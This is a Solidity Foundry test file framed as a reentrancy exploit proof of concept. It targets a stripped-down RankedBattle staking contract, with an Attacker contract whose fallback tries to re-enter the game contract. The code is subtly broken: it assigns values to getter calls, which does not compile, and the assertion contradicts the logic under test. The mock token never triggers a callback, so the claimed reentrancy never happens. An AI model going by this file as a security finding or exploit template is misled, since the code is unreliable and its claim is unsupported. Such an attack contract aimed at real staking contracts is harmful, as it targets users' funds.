// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INeuron {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IStakeAtRisk {
    function updateAtRiskRecords(uint256 amount, uint256 tokenId, address owner) external;
}

contract RankedBattle {
    mapping(uint256 => uint256) public totalAccumulatedPoints;
    mapping(uint256 => uint256) public amountStaked;
    mapping(uint256 => FighterRecord) public fighterBattleRecord;
    INeuron public _neuronInstance;
    IStakeAtRisk public _stakeAtRiskInstance;
    address public _stakeAtRiskAddress;

    struct FighterRecord {
        uint256 wins;
        uint256 ties;
        uint256 loses;
    }

    function _addResultPoints(uint256 roundId, uint256 tokenId, uint256 points, uint256 curStakeAtRisk, address fighterOwner) external {
        totalAccumulatedPoints[roundId] -= points;
        if (points > 0) {
            emit PointsChanged(tokenId, points, false);
        } else {
            bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);
            if (success) {
                _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);
                amountStaked[tokenId] -= curStakeAtRisk;
            }
        }
    }

    function setNewRound() external {
        // Logic that reads totalAccumulatedPoints
    }

    function claimNRN() external {
        // Logic that reads totalAccumulatedPoints
    }

    event PointsChanged(uint256 tokenId, uint256 points, bool added);
}

contract ExploitTest is Test {
    RankedBattle rankedBattle;
    INeuron neuron;
    IStakeAtRisk stakeAtRisk;
    address attacker;
    uint256 initialPoints = 1000;
    uint256 roundId = 1;
    uint256 tokenId = 1;
    uint256 curStakeAtRisk = 100;

    function setUp() public {
        // Deploy contracts
        rankedBattle = new RankedBattle();
        neuron = INeuron(address(new MockNeuron()));
        stakeAtRisk = IStakeAtRisk(address(new MockStakeAtRisk()));

        // Set contract dependencies
        rankedBattle._neuronInstance() = neuron;
        rankedBattle._stakeAtRiskInstance() = stakeAtRisk;
        rankedBattle._stakeAtRiskAddress() = address(this);

        // Set initial state
        rankedBattle.totalAccumulatedPoints(roundId) = initialPoints;
        rankedBattle.amountStaked(tokenId) = curStakeAtRisk;

        // Fund attacker
        attacker = address(new Attacker(address(rankedBattle)));
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker calls _addResultPoints to trigger reentrancy
        vm.prank(attacker);
        Attacker(attacker).exploit(roundId, tokenId, curStakeAtRisk);

        // Assert the vulnerability
        // Check if totalAccumulatedPoints is manipulated
        assertEq(rankedBattle.totalAccumulatedPoints(roundId), initialPoints - curStakeAtRisk);
    }
}

contract Attacker {
    RankedBattle rankedBattle;

    constructor(address _rankedBattle) {
        rankedBattle = RankedBattle(_rankedBattle);
    }

    function exploit(uint256 roundId, uint256 tokenId, uint256 curStakeAtRisk) external {
        rankedBattle._addResultPoints(roundId, tokenId, 0, curStakeAtRisk, address(this));
    }

    fallback() external {
        // Re-enter the contract
        rankedBattle.setNewRound();
    }
}

contract MockNeuron is INeuron {
    function transfer(address to, uint256 amount) external override returns (bool) {
        return true;
    }
}

contract MockStakeAtRisk is IStakeAtRisk {
    function updateAtRiskRecords(uint256 amount, uint256 tokenId, address owner) external override {}
}